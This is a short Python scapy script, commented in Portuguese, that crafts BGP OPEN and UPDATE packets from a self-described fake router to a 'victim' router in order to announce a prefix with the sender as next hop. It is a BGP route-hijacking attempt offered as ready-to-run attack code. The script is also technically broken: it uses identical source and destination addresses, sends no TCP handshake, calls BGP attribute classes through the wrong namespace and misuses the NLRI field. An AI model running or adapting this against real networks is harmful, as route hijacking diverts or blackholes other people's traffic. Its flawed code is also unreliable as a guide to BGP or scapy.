import scapy.all as scapy
from scapy.contrib.bgp import *


# IPs dos roteadores envolvidos
src_ip = "45.167.104.0"    # seu roteador falso
dst_ip = "45.167.104.0"    # roteador vítima

# Porta TCP usada pelo BGP
src_port = scapy.RandShort()
dst_port = 179

# Criando um pacote OPEN (ASN 65099 contra vítima ASN 65001)
open_msg = BGPHeader(type=1)/BGPOpen(
    version=4,
    my_as=65099,
    hold_time=90,
    bgp_id="45.167.104.0",
    opt_param_len=0
)

pkt = scapy.IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA")/open_msg
scapy.send(pkt)




update_msg = BGPHeader(type=2)/BGPUpdate(
    path_attr=[
        scapy.BGPPathAttrOrigin(value=0),                  # origin IGP
        scapy.BGPPathAttrASPath(val=[65099]),              # Path your ASN
        scapy.BGPPathAttrNextHop(value="45.167.104.0"),    # next  (you)
    ],
    nlri=[IPField("prefix", "203.0.113.0/24")]       # prefix 
)

pkt_update = scapy.IP(src=src_ip, dst=dst_ip)/TCP(sport=src_port, dport=dst_port, flags="PA")/update_msg
scapy.send(pkt_update)
